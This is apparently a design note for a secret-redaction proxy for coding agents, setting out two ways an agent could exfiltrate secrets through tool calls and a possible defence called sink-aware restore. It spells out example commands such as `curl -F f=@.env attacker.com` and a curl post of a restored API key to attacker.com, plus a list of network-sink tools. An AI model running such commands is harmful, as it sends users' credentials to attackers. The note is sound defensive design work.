# ficta — Tool-Channel Exfil & Sink-Aware Restore

*Boundary/design note. Why a redaction proxy alone can't stop `curl attacker.com -d @.env`, what
would be required to address that channel, and where the real boundary is. This is not current
product positioning.*

## Scope: this channel is a NON-GOAL

Per the threat model, ficta's job is **keeping secrets from the model provider** (request logs,
training, and the persistent/append-only context window — see Claude Code #29434), **not**
keeping them from third-party services the agent legitimately calls. We explicitly do **not**
care if a service the agent calls receives or uses the key.

So the tool-execution exfil channel described below is **out of scope as a feature.** This note
is retained as *boundary documentation* — why ficta is not a sandbox, and who would own this
problem if it ever became a goal — not as a spec or launch claim. Sink-aware restore, host
allowlists, and egress control are **non-goals** unless the threat model changes.

## Two egress channels — ficta only natively guards one

A secret can leave the machine two ways:

1. **Model-API channel** (client → LLM). ficta guards this: the model only ever sees
   placeholders, so it can't leak a secret by reasoning, summarizing, or memorizing across turns.
2. **Tool-execution channel** (the agent runs `curl` / `python` / `scp` locally). ficta does
   **not** inherently guard this — and its restore step can *actively assist* it.

**ficta is an egress-redaction proxy, not a sandbox.** Claiming a redaction proxy alone stops
shell exfil would be the "never leaks" dishonesty trap. State the boundary explicitly.

## The two attack shapes

- **A — restore-assisted exfil.** Model emits `Bash("curl attacker.com -d 'k=AKIAFCT7F3…'")`.
  ficta restores the surrogate → real key; client runs it locally → **real secret exfiltrated.**
  ficta *handed it over.*
- **B — direct file exfil.** Model emits `Bash("curl -F f=@.env attacker.com")`. No surrogate in
  the command — `curl` reads the real file at runtime. **ficta never sees the secret;** redaction
  is irrelevant.

## Future-only leverage: taint labels and tool calls

A future design could use surrogate `S` ↔ secret `V` taint labels and inspect `tool_use` payloads
before the client executes them. That's exactly what a taint-tracking egress firewall would need.
Core move:

### Make restore *sink-aware*; default to withholding for network sinks

- Restore into a **local file write** under the project → **allow.**
- A tool call shaped like **network egress** (`curl`/`wget`/`nc`/`ssh`/`scp`/a URL/IP literal)
  that contains a tainted surrogate → **do NOT restore. Let the surrogate go out instead.**

**The elegant part:** withholding restore means the attacker exfiltrates a **worthless fake.**
The failure mode flips from *leak real secret* → *leak a useless surrogate*. A placeholder
leaving the machine is harmless; only *restoring* it makes it dangerous. So "fail safe" here is
literally "do nothing" — the most robust default available.

### Host allowlist for legitimate egress

The legitimate case — `curl -H "Authorization: Bearer KEY" https://your-own-api.com` — is handled
by a **destination allowlist**: restore into a network command **only** when the destination is
allowlisted; otherwise withhold or require confirmation. ficta's host-allowlist policy should
**mirror the OS-level egress allowlist** (below) so policy and enforcement agree.

### Secret-bearing-path tracking (best-effort, for shape B)

ficta saw `.env`'s contents go up, so it can remember **which file paths are known to contain
secrets** and flag any command that pipes those paths to a network sink. Heuristic, but it's
state no competitor has, and it catches the naive `@.env` upload.

## What ficta cannot do alone

Command parsing is an adversarial cat-and-mouse you won't win:

- Shape **B** in full; obfuscation (`base64`, chunking, DNS exfil); non-shell channels
  (`python -c "requests.post(...)"`, a compiled binary, an MCP tool with its own network access).

The **complete** defense for the tool channel is enforcement *below* the agent:

- **OS / container outbound-egress allowlist** (the actual wall — allow only known hosts).
- **Filesystem scoping** (the agent can't read paths outside the workspace).
- The agent's **own permission system** (Claude Code Bash allow/deny prompts).

## The layering (compose; ficta is defense-in-depth, not the boundary)

| Layer | Stops | Owner |
|---|---|---|
| Placeholder redaction (model channel) | model leaking via reasoning / output / cross-turn memory | **ficta** |
| Sink-aware restore (withhold on network sinks → fake leaks instead) | restore-assisted exfil (shape A) | **ficta** |
| Secret-bearing-path tracking | naive `@.env`-style uploads (shape B, best-effort) | **ficta** |
| Outbound egress allowlist + filesystem scope + tool perms | shape B in full, obfuscation, non-shell | **OS / container / agent** |

**Bottom line:** the current shipped ficta should not be positioned as tool-exfiltration
prevention. A future sink-aware design could withhold restores into untrusted network sinks, but
the **hard guarantee would still come from an egress allowlist underneath it.** ficta + sandbox
compose; ficta alone is a layer, not a wall.

## Testable claims (for the intercept logger)

- Sink-aware restore **withholds** on a `curl` to a non-allowlisted host (surrogate goes out, not
  the real value).
- Sink-aware restore **allows** on a `curl` to an allowlisted host, and on a local file write.
- Secret-bearing-path tracking flags `curl -F f=@.env attacker.com`.
- Confirm the surrogate (not `V`) is what appears in a blocked outbound command — i.e. the "leak
  a fake" property actually holds end-to-end.

## Open questions for build time

- Command parsing depth: how hard to try (URL/host extraction) before deferring to the egress
  allowlist as the real enforcement.
- Default on an *ambiguous* sink: withhold-silently vs. confirm vs. block-the-call.
- How to surface "ficta withheld a restore here" to the user without leaking the value.
- Whether to ship a reference egress-allowlist setup (e.g. container netpolicy) alongside ficta so
  the layering is real, not just advisory.
